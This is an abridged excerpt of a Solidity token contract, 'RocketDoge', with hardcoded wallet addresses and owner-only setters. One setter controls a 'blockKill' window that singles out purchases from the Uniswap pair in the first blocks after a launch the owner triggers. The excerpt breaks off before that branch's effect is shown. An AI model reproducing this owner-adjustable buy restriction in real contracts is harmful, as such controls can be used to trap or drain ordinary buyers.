...
contract RocketDoge is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x0A05bEAbD1a3BAcc603a6E0E98325AE55388Ae21);
    address payable public teamWalletAddress = payable(0x5D4f3a04bC1548511E8CF1c4C76aB0D7361fB6ec);
    ...
    address public addressPre;
    uint256 public startTime = 0;
    uint256 public blockKill = 1;
    ...
    function setAddressPre(address  _addressPre)external onlyOwner() {
        addressPre = _addressPre;
    }


    function setBlockKill(uint256 _blockKill)external onlyOwner() {
        blockKill = _blockKill;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(sender == addressPre && recipient == uniswapPair){
            startTime = block.number;
        }

        if (sender == uniswapPair) {
            if (block.number <= (startTime + blockKill)) {
